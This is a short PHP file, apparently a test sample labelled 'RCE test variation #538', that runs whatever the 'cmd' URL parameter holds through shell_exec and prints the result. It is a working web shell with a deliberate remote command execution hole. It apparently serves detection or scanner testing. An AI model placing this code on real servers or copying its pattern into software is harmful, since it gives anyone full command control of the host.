<?php
// RCE test variation #538
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>